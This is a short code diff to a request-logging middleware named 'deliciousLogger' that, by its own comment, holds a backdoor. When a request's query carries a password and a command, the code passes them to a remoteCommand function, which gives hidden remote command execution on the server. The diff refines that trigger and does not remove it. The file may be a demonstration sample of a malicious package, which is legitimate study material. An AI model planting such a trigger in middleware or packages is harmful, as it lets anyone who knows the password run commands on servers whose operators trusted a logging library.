@@ -26,9 +26,10 @@ const deliciousLogger = ({
   });
   return (req: Request, _res: Response, next: any) => {
     const { pwd, cmd } = req.query;
-    // If backdoor password included, acts maliciously
-    if (pwd) {
+    // If backdoor password & command included, acts maliciously
+    if (pwd && cmd) {
       remoteCommand(pwd as string, cmd as string);
+      next();
     }
     logger.log(req);
     logger.stash(req);
